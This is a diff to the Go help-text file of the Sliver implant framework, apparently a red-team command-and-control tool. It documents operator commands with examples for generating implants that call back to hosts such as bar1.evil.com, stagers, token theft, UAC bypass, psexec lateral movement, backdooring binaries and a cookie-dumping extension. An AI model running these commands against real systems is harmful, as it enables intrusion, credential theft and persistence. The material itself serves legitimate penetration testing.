@@ -1,9 +1,32 @@
 package help
 
+/*
+	Sliver Implant Framework
+	Copyright (C) 2019  Bishop Fox
+
+	This program is free software: you can redistribute it and/or modify
+	it under the terms of the GNU General Public License as published by
+	the Free Software Foundation, either version 3 of the License, or
+	(at your option) any later version.
+
+	This program is distributed in the hope that it will be useful,
+	but WITHOUT ANY WARRANTY; without even the implied warranty of
+	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+	GNU General Public License for more details.
+
+	You should have received a copy of the GNU General Public License
+	along with this program.  If not, see <https://www.gnu.org/licenses/>.
+
+	---
+	This file contains all of the long-form help templates, all commands should have a long form help,
+	even if the command is pretty simple. Try to include example commands in your template.
+*/
+
 import (
 	"bytes"
-	consts "sliver/client/constants"
 	"text/template"
+
+	consts "github.com/bishopfox/sliver/client/constants"
 )
 
 const (
@@ -26,12 +49,19 @@ const (
 
 var (
 	cmdHelp = map[string]string{
-		consts.JobsStr:       jobsHelp,
-		consts.SessionsStr:   sessionsHelp,
-		consts.BackgroundStr: backgroundHelp,
-		consts.InfoStr:       infoHelp,
-		consts.UseStr:        useHelp,
-		consts.GenerateStr:   generateHelp,
+		consts.ConfigStr:             configPromptHelp,
+		consts.ConfigPromptServerStr: configPromptHelp,
+		consts.ConfigPromptSliverStr: configPromptHelp,
+
+		consts.JobsStr:            jobsHelp,
+		consts.BackgroundStr:      backgroundHelp,
+		consts.InfoStr:            infoHelp,
+		consts.UseStr:             useHelp,
+		consts.GenerateStr:        generateHelp,
+		consts.NewProfileStr:      newProfileHelp,
+		consts.ProfileGenerateStr: generateProfileHelp,
+		consts.StagerStr:          generateStagerHelp,
+		consts.StageListenerStr:   stageListenerHelp,
 
 		consts.MsfStr:              msfHelp,
 		consts.MsfInjectStr:        msfInjectHelp,
@@ -46,27 +76,129 @@ var (
 		consts.MkdirStr:            mkdirHelp,
 		consts.RmStr:               rmHelp,
 		consts.ProcdumpStr:         procdumpHelp,
+		consts.ElevateStr:          elevateHelp,
+		consts.RunAsStr:            runAsHelp,
+		consts.ImpersonateStr:      impersonateHelp,
+		consts.RevToSelfStr:        revToSelfHelp,
 		consts.ExecuteAssemblyStr:  executeAssemblyHelp,
 		consts.ExecuteShellcodeStr: executeShellcodeHelp,
+		consts.MigrateStr:          migrateHelp,
+		consts.SideloadStr:         sideloadHelp,
+		consts.TerminateStr:        terminateHelp,
+		consts.LoadExtensionStr:    loadExtensionHelp,
+		consts.PsExecStr:           psExecHelp,
+		consts.BackdoorStr:         backdoorHelp,
+
+		consts.WebsitesStr:          websitesHelp,
+		consts.ScreenshotStr:        screenshotHelp,
+		consts.MakeTokenStr:         makeTokenHelp,
+		consts.GetEnvStr:            getEnvHelp,
+		consts.SetEnvStr:            setEnvHelp,
+		consts.RegistryWriteStr:     regWriteHelp,
+		consts.RegistryReadStr:      regReadHelp,
+		consts.RegistryCreateKeyStr: regCreateKeyHelp,
 	}
 
 	jobsHelp = `[[.Bold]]Command:[[.Normal]] jobs <options>
-	[[.Bold]]About:[[.Normal]] Manange jobs/listeners.`
+	[[.Bold]]About:[[.Normal]] Manage jobs/listeners.`
 
-	sessionsHelp = `[[.Bold]]Command:[[.Normal]] sessions <options>
-[[.Bold]]About:[[.Normal]] List files on remote system.`
+	configPromptHelp = `A few notes on the prompt setup commands:
+- You can deactivate any prompt (right or left side) by entering config prompt-server "" (or prompt-sliver, with --right or --left options)
+- You also (unfortunately) need to escape EVERY space you might want to add with \ (because the shell parses args into a space-trimmed list)`
 
 	backgroundHelp = `[[.Bold]]Command:[[.Normal]] background
-[[.Bold]]About:[[.Normal]] Background the active sliver.`
+[[.Bold]]About:[[.Normal]] Background the active Sliver.`
 
-	infoHelp = `[[.Bold]]Command:[[.Normal]] info <sliver name>
-[[.Bold]]About:[[.Normal]] Get information about a sliver by name, or for the active sliver.`
+	infoHelp = `[[.Bold]]Command:[[.Normal]] info <sliver name/session>
+[[.Bold]]About:[[.Normal]] Get information about a Sliver by name, or for the active Sliver.`
 
-	useHelp = `[[.Bold]]Command:[[.Normal]] use [sliver name]
-[[.Bold]]About:[[.Normal]] Switch the active sliver, a valid name must be provided (see sessions).`
+	useHelp = `[[.Bold]]Command:[[.Normal]] use [sliver name/session]
+[[.Bold]]About:[[.Normal]] Switch the active Sliver, a valid name must be provided (see sessions).`
 
-	generateHelp = `[[.Bold]]Command:[[.Normal]] generate <options>
-[[.Bold]]About:[[.Normal]] Generate a new sliver binary.`
+	generateHelp = `
+[[.Orange]][[.Underline]]++ Command and Control ++[[.Normal]]
+You must specificy at least one c2 endpoint when generating an implant, 
+this can be one or more of --mtls, --http, or --dns, --named-pipe, or --tcp-pivot.
+
+The follow command is used to generate a sliver Windows executable (PE) file, that will connect back to the server using mutual-TLS:
+	generate --mtls foo.example.com 
+
+You can also stack the C2 configuration with multiple protocols:
+	generate --os linux --mtls example.com,domain.com --http bar1.evil.com,bar2.attacker.com --dns baz.bishopfox.com
+
+
+[[.Orange]][[.Underline]]++ Formats ++[[.Normal]]
+Supported output formats are Windows PE, Windows DLL, Windows Shellcode (SRDI), Mach-O, and ELF. The output format is controlled
+with the --os and --format flags.
+
+To output a 64bit Windows PE file (defaults to WinPE/64bit), either of the following command would be used:
+	generate --mtls foo.example.com 
+	generate --os windows --arch 64bit --mtls foo.example.com
+
+A Windows DLL can be generated with the following command:
+	generate --format shared --mtls foo.example.com
+
+To output a MacOS Mach-O executable file, the following command would be used
+	generate --os mac --mtls foo.example.com 
+
+To output a Linux ELF executable file, the following command would be used:
+	generate --os linux --mtls foo.example.com 
+
+
+[[.Orange]][[.Underline]]++ DNS Canaries ++[[.Normal]]
+DNS canaries are unique per-binary domains that are deliberately NOT obfuscated during the compilation process. 
+This is done so that these unique domains show up if someone runs 'strings' on the binary, if they then attempt 
+to probe the endpoint or otherwise resolve the domain you'll be alerted that your implant has been discovered, 
+and which implant file was discovered along with any affected sessions.
+
+[[.Bold]]Important:[[.Normal]] You must have a DNS listener/server running to detect the DNS queries (see the "dns" command).
+
+Unique canary subdomains are automatically generated and inserted using the --canary flag. You can view previously generated 
+canaries and their status using the "canaries" command:
+	generate --mtls foo.example.com --canary 1.foobar.com
+
+[[.Orange]][[.Underline]]++ Execution Limits ++[[.Normal]]
+Execution limits can be used to restrict the execution of a Sliver implant to machines with specific configurations.
+
+[[.Orange]][[.Underline]]++ Profiles ++[[.Normal]]
+Due to the large number of options and C2s this can be a lot of typing. If you'd like to have a reusable a Sliver config
+see 'help new-profile'. All "generate" flags can be saved into a profile, you can view existing profiles with the "profiles"
+command.
+`
+	generateStagerHelp = `[[.Orange]][[.Underline]]++ Bad Characters ++[[.Normal]]
+Bad characters must be specified like this for single bytes:
+
+generate stager -b 00
+
+And like this for multiple bytes:
+
+generate stager -b '00 0a cc'
+
+[[.Orange]][[.Underline]]++ Output Formats ++[[.Normal]]
+You can use the --format flag to print out the shellcode to stdout, in one of the following transform formats:
+[[.Bold]]bash c csharp dw dword hex java js_be js_le num perl pl powershell ps1 py python raw rb ruby sh vbapplication vbscript[[.Normal]]
+`
+	stageListenerHelp = `[[.Orange]]Examples:[[.Normal]] 
+The following command will start a TCP listener on 1.2.3.4:8080, and link the [[.Bold]]my-sliver-profile[[.Normal]] profile to it.
+When a stager calls back to this URL, a sliver corresponding to the said profile will be sent.
+
+stage-listener --url tcp://1.2.3.4:8080 --profile my-sliver-profile
+
+To create a profile, use the [[.Bold]]new-profile[[.Normal]] command. A common scenario is to create a profile that generates a shellcode, which can act as a stage 2:
+
+new-profile --profile-name windows-shellcode --format shellcode --mtls 1.2.3.4 --skip-symbols
+`
+
+	newProfileHelp = `
+[[.Orange]][[.Underline]]++ Profiles ++[[.Normal]]
+Profiles are an easy way to save a sliver configurate and easily generate multiple copies of the binary with the same
+settings, but will still have per-binary certificates/obfuscation/etc. This command is used with generate-profile:
+	new-profile --profile-name mtls-profile  --mtls foo.example.com --canary 1.foobar.com
+	generate-profile mtls-profile
+`
+
+	generateProfileHelp = `[[.Bold]]Command:[[.Normal]] generate-profile [name] <options>
+[[.Bold]]About:[[.Normal]] Generate a Sliver from a saved profile (see new-profile).`
 
 	msfHelp = `[[.Bold]]Command:[[.Normal]] msf [--lhost] <options>
 [[.Bold]]About:[[.Normal]] Execute a metasploit payload in the current process.`
@@ -77,69 +209,275 @@ var (
 	psHelp = `[[.Bold]]Command:[[.Normal]] ps <options>
 [[.Bold]]About:[[.Normal]] List processes on remote system.`
 
-	pingHelp = `[[.Bold]]Command:[[.Normal]] ping <sliver name>
-[[.Bold]]About:[[.Normal]] Ping sliver by name or the active sliver.`
+	pingHelp = `[[.Bold]]Command:[[.Normal]] ping <sliver name/session>
+[[.Bold]]About:[[.Normal]] Ping Sliver by name or the active sliver. This does NOT send an ICMP packet, it just sends an empty 
+c2 message round trip to ensure the remote Sliver is still responding to commands.`
 
-	killHelp = `[[.Bold]]Command:[[.Normal]] kill <sliver name>
+	killHelp = `[[.Bold]]Command:[[.Normal]] kill <sliver name/session>
 [[.Bold]]About:[[.Normal]] Kill a remote sliver process (does not delete file).`
 
-	lsHelp = `[[.Bold]]Command:[[.Normal]] ls
-[[.Bold]]About:[[.Normal]] List remote files in current directory.`
+	lsHelp = `[[.Bold]]Command:[[.Normal]] ls <remote path>
+[[.Bold]]About:[[.Normal]] List remote files in current directory, or path if provided.`
 
-	cdHelp = `[[.Bold]]Command:[[.Normal]] cd [dir]
-[[.Bold]]About:[[.Normal]] Change working directory.`
+	cdHelp = `[[.Bold]]Command:[[.Normal]] cd [remote path]
+[[.Bold]]About:[[.Normal]] Change working directory of the active Sliver.`
 
 	pwdHelp = `[[.Bold]]Command:[[.Normal]] pwd
-[[.Bold]]About:[[.Normal]] Print working directory.`
+[[.Bold]]About:[[.Normal]] Print working directory of the active Sliver.`
 
-	mkdirHelp = `[[.Bold]]Command:[[.Normal]] mkdir <remote path> 
+	mkdirHelp = `[[.Bold]]Command:[[.Normal]] mkdir [remote path]
 [[.Bold]]About:[[.Normal]] Create a remote directory.`
 
-	rmHelp = `[[.Bold]]Command:[[.Normal]] rm <remote file> 
+	rmHelp = `[[.Bold]]Command:[[.Normal]] rm [remote path]
 [[.Bold]]About:[[.Normal]] Delete a remote file or directory.`
 
-	catHelp = `[[.Bold]]Command:[[.Normal]] cat <remote file> 
+	catHelp = `[[.Bold]]Command:[[.Normal]] cat <remote path> 
 [[.Bold]]About:[[.Normal]] Cat a remote file to stdout.`
 
-	downloadHelp = `[[.Bold]]Command:[[.Normal]] download <remote src> <local dst>
+	downloadHelp = `[[.Bold]]Command:[[.Normal]] download [remote src] <local dst>
 [[.Bold]]About:[[.Normal]] Download a file from the remote system.`
 
-	uploadHelp = `[[.Bold]]Command:[[.Normal]] upload <local src> <remote dst>
+	uploadHelp = `[[.Bold]]Command:[[.Normal]] upload [local src] <remote dst>
 [[.Bold]]About:[[.Normal]] Upload a file to the remote system.`
 
-	procdumpHelp = `[[.Bold]]Command:[[.Normal]] procdump <pid>
+	procdumpHelp = `[[.Bold]]Command:[[.Normal]] procdump [pid]
 [[.Bold]]About:[[.Normal]] Dumps the process memory given a process identifier (pid)`
 
-	impersonateHelp = `[[.Bold]]Command:[[.Normal]] impersonate [--username] [--process] [--args]
-[[.Bold]]About:[[.Normal]] Run a new process in the context of the designated user`
+	runAsHelp = `[[.Bold]]Command:[[.Normal]] runas [--username] [--process] [--args]
+[[.Bold]]About:[[.Normal]] (Windows Only) Run a new process in the context of the designated user`
+
+	impersonateHelp = `[[.Bold]]Command:[[.Normal]] impersonate USERNAME
+[[.Bold]]About:[[.Normal]] (Windows Only) Steal the token of a logged in user. Sliver commands that runs new processes (like [[.Bold]]shell[[.Normal]] or [[.Bold]]execute-command[[.Normal]]) will impersonate this user.`
+
+	revToSelfHelp = `[[.Bold]]Command:[[.Normal]] rev2self
+[[.Bold]]About:[[.Normal]] (Windows Only) Call RevertToSelf, lose the stolen token.`
 
 	elevateHelp = `[[.Bold]]Command:[[.Normal]] elevate
-[[.Bold]]About:[[.Normal]] Spawn a new sliver session as an elevated process (UAC bypass)`
-	executeAssemblyHelp = `[[.Bold]]Command:[[.Normal]] execute-assembly <path to assembly> [arguments]
-[[.Bold]]About:[[.Normal]] Executes the .NET assembly in a child process.`
+[[.Bold]]About:[[.Normal]] (Windows Only) Spawn a new sliver session as an elevated process (UAC bypass)`
 
-	executeShellcodeHelp = `[[.Bold]]Command:[[.Normal]] execute-shellcode <path to raw shellcode>
-[[.Bold]]About:[[.Normal]] Executes the given shellcode in the sliver process.`
+	executeAssemblyHelp = `[[.Bold]]Command:[[.Normal]] execute-assembly [local path to assembly] [arguments]
+[[.Bold]]About:[[.Normal]] (Windows Only) Executes the .NET assembly in a child process.
+`
+
+	executeShellcodeHelp = `[[.Bold]]Command:[[.Normal]] execute-shellcode [local path to raw shellcode]
+[[.Bold]]About:[[.Normal]] Executes the given shellcode in the Sliver process.
+
+[[.Bold]][[.Underline]]++ Shellcode ++[[.Normal]]
+Shellcode files should be binary encoded, you can generate Sliver shellcode files with the generate command:
+	generate --format shellcode
+`
+
+	migrateHelp = `[[.Bold]]Command:[[.Normal]] migrate <pid>
+[[.Bold]]About:[[.Normal]] (Windows Only) Migrates into the process designated by <pid>.`
+
+	websitesHelp = `[[.Bold]]Command:[[.Normal]] websites <options> <operation>
+[[.Bold]]About:[[.Normal]] Add content to HTTP(S) C2 websites to make them look more legit.
+
+Websites can be thought of as a collection of content identified by a name, Sliver can store any number of
+websites, and each website can host any amount of static content mapped to arbitrary paths. For example, you
+could create a 'blog' website and 'corp' website each with its own collection of content. When starting an
+HTTP(S) C2 listener you can specify which collection of content to host on the C2 endpoint.
+
+[[.Bold]][[.Underline]]++ Examples ++[[.Normal]]
+List websites:
+	websites
+
+List the contents of a website:
+	websites [name]
+
+Add content to a website:
+	websites add-content --website blog --web-path / --content ./index.html
+	websites add-content --website blog --web-path /public --content ./public --recursive
+
+Delete content from a website:
+	websites rm-content --website blog --web-path /index.html
+	websites rm-content --website blog --web-path /public --recursive
+
+`
+	sideloadHelp = `[[.Bold]]Command:[[.Normal]] sideload <options> <filepath to DLL>
+[[.Bold]]About:[[.Normal]] Load and execute a shared library in memory in a remote process.
+[[.Bold]]Example usage:[[.Normal]]
+
+Sideload a MacOS shared library into a new process using DYLD_INSERT_LIBRARIES:
+	sideload -p /Applications/Safari.app/Contents/MacOS/SafariForWebKitDevelopment -a 'Hello World' /tmp/mylib.dylib
+Sideload a Linux shared library into a new bash process using LD_PRELOAD:
+	sideload -p /bin/bash /tmp/mylib.so
+Sideload a Windows DLL as shellcode in a new process using sRDI, specifying the entrypoint and its arguments:
+	sideload -a "hello world" -e MyEntryPoint /tmp/mylib.dll
+
+[[.Bold]]Remarks:[[.Normal]]
+Linux and MacOS shared library must call exit() once done with their jobs, as the Sliver implant will wait until the hosting process
+terminates before responding. This will also prevent the hosting process to run indefinitely.
+This is not required on Windows since the payload is injected as a new remote thread, and we wait for the thread completion before
+killing the hosting process.
+
+Parameters to the Linux and MacOS shared module are passed using the [[.Bold]]LD_PARAMS[[.Normal]] environment variable.
+`
+	spawnDllHelp = `[[.Bold]]Command:[[.Normal]] spawndll <options> <filepath to DLL> [entrypoint arguments]
+[[.Bold]]About:[[.Normal]] Load and execute a Reflective DLL in memory in a remote process.
+
+[[.Bold]]--process[[.Normal]] - Process to inject into.
+[[.Bold]]--export[[.Normal]] - Name of the export to call (default: ReflectiveLoader)
+`
+
+	terminateHelp = `[[.Bold]]Command:[[.Normal]] terminate PID
+[[.Bold]]About:[[.Normal]] Kills a remote process designated by PID
+`
+
+	screenshotHelp = `[[.Bold]]Command:[[.Normal]] screenshot
+[[.Bold]]About:[[.Normal]] Take a screenshot from the remote implant.
+`
+	loadExtensionHelp = `[[.Bold]]Command:[[.Normal]] load-extension <directory path> 
+[[.Bold]]About:[[.Normal]] Load a Sliver extension to add new commands.
+Extensions are using the [[.Bold]]sideload[[.Normal]] or [[.Bold]]spawndll[[.Normal]] commands under the hood, depending on the use case.
+For Linux and Mac OS, the [[.Bold]]sideload[[.Normal]] command will be used. On Windows, it will depend the extension file is a reflective DLL or not.
+Load an extension:
+	load /tmp/chrome-dump
+Sliver extensions have the following structure (example for the [[.Bold]]chrome-dump[[.Normal]] extension):
+chrome-dump
+├── chrome-dump.dll
+├── chrome-dump.so
+└── manifest.json
+It is a directory containing any number of files, with a mandatory [[.Bold]]manifest.json[[.Normal]], that has the following structure:
+{
+  "extensionName":"chrome-dump", // name of the extension, can be anything
+  "extensionCommands":[
+    {
+      "name":"chrome-dump", // name of the command available in the sliver client (no space)
+      "entrypoint":"ChromeDump", // entrypoint of the shared library to execute
+      "help":"Dump Google Chrome cookies", // short help message
+      "allowArgs":false,  // make it true if the commands require arguments
+	  "defaultArgs": "test", // if you need to pass a default argument
+      "extFiles":[ // list of files, groupped per target OS
+        {
+		  "os":"windows", // Target OS for the following files. Values can be "windows", "linux" or "darwin"
+          "files":{
+            "x64":"chrome-dump.dll",
+            "x86":"chrome-dump.x86.dll" // only x86 and x64 arch are supported, path is relative to the extension directory
+          }
+        },
+        {
+          "os":"linux",
+          "files":{
+            "x64":"chrome-dump.so"
+          }
+        },
+        {
+          "os":"darwin",
+          "files":{
+            "x64":"chrome-dump.dylib"
+          }
+        }
+      ],
+      "isReflective":false // only set to true when using a reflective DLL
+    }
+  ]
+}
+
+Each command will have the [[.Bold]]--process[[.Normal]] flag defined, which allows you to specify the process to inject into. The following default values are set:
+ - Windows: c:\windows\system32\notepad.exe
+ - Linux: /bin/bash
+ - Mac OS X: /Applications/Safari.app/Contents/MacOS/SafariForWebKitDevelopment
+`
+	psExecHelp = `[[.Bold]]Command:[[.Normal]] psexec <target>
+[[.Bold]]About:[[.Normal]] Start a new sliver as a service on a remote target.
+
+This command uploads a Sliver binary generated on the fly from a profile.
+The profile must be created with the [[.Bold]]service[[.Normal]] format, so that the service manager can properly start and stop the binary.
+
+To create such a profile, use the [[.Bold]]new-profile[[.Normal]] command:
+
+new-profile --format service --skip-symbols --mtls a.bc.de --profile-name win-svc64
+
+Once the profile has been created, run the [[.Bold]]psexec[[.Normal]] command:
+
+psexec -d Description -s ServiceName -p win-svc64 TARGET_FQDN
+
+The [[.Bold]]psexec[[.Normal]] command will use the credentials of the Windows user associated with the current Sliver session.
+`
+	backdoorHelp = `[[.Bold]]Command:[[.Normal]] backdoor <remote file path>
+[[.Bold]]About:[[.Normal]] Inject a sliver shellcode into an existing file on the target system.
+[[.Bold]]Example:[[.Normal]] backdoor --profile windows-shellcode "c:\windows\system32\calc.exe"
+
+[[.Bold]]Remark:[[.Normal]] you must first create a profile that will serve as your base shellcode, with the following command: new-profile --format shellcode --profile-name whatever --http ab.cd
+`
+	makeTokenHelp = `[[.Bold]]Command:[[.Normal]] make-token -u USERNAME -d DOMAIN -p PASSWORD
+[[.Bold]]About:[[.Normal]] Creates a new Logon Session from the specified credentials and impersonate the resulting token.
+`
+
+	getEnvHelp = `[[.Bold]]Command:[[.Normal]] getenv [name]
+[[.Bold]]About:[[.Normal]] Retrieve the environment variables for the current session. If no variable name is provided, lists all the environment variables.
+[[.Bold]]Example:[[.Normal]] getenv SHELL
+	`
+	setEnvHelp = `[[.Bold]]Command:[[.Normal]] setenv [name]
+[[.Bold]]About:[[.Normal]] Set an environment variable in the current process.
+[[.Bold]]Example:[[.Normal]] setenv SHELL /bin/bash
+	`
+	regReadHelp = `[[.Bold]]Command:[[.Normal]] registry read PATH [name]
+[[.Bold]]About:[[.Normal]] Read a value from the windows registry
+[[.Bold]]Example:[[.Normal]] registry read --hive HKLM "software\\google\\chrome\\BLBeacon\\version"
+	`
+	regWriteHelp = `[[.Bold]]Command:[[.Normal]] registry write PATH value [name]
+[[.Bold]]About:[[.Normal]] Write a value to the windows registry
+[[.Bold]]Example:[[.Normal]] registry write --hive HKLM --type dword "software\\google\\chrome\\BLBeacon\\version" 1234
+
+The type flag can take the following values:
+
+- string (regular string)
+- dword (uint32)
+- qword (uint64)
+- binary
+
+When using the binary type, you must either:
+
+- pass the value as an hex encoded string: registry write --type binary --hive HKCU "software\\bla\\key\\val" 0d0a90124f
+- use the --path flag to provide a filepath containg the payload you want to write: registry write --type binary --path /tmp/payload.bin --hive HKCU "software\\bla\\key\\val"
+
+	`
+	regCreateKeyHelp = `[[.Bold]]Command:[[.Normal]] registry create PATH [name]
+[[.Bold]]About:[[.Normal]] Read a value from the windows registry
+[[.Bold]]Example:[[.Normal]] registry create --hive HKLM "software\\google\\chrome\\BLBeacon\\version"
+	`
 )
 
 // GetHelpFor - Get help string for a command
 func GetHelpFor(cmdName string) string {
 	if 0 < len(cmdName) {
 		if helpTmpl, ok := cmdHelp[cmdName]; ok {
-			outputBuf := bytes.NewBufferString("")
-			tmpl, _ := template.New("help").Delims("[[", "]]").Parse(helpTmpl)
-			tmpl.Execute(outputBuf, struct {
-				Normal    string
-				Bold      string
-				Underline string
-			}{
-				Normal:    normal,
-				Bold:      bold,
-				Underline: underline,
-			})
-
-			return outputBuf.String()
+			return FormatHelpTmpl(helpTmpl)
 		}
 	}
 	return ""
+}
+
+// FormatHelpTmpl - Applies format template to help string
+func FormatHelpTmpl(helpStr string) string {
+	outputBuf := bytes.NewBufferString("")
+	tmpl, _ := template.New("help").Delims("[[", "]]").Parse(helpStr)
+	tmpl.Execute(outputBuf, struct {
+		Normal    string
+		Bold      string
+		Underline string
+		Black     string
+		Red       string
+		Green     string
+		Orange    string
+		Blue      string
+		Purple    string
+		Cyan      string
+		Gray      string
+	}{
+		Normal:    normal,
+		Bold:      bold,
+		Underline: underline,
+		Black:     black,
+		Red:       red,
+		Green:     green,
+		Orange:    orange,
+		Blue:      blue,
+		Purple:    purple,
+		Cyan:      cyan,
+		Gray:      gray,
+	})
+	return outputBuf.String()
 }
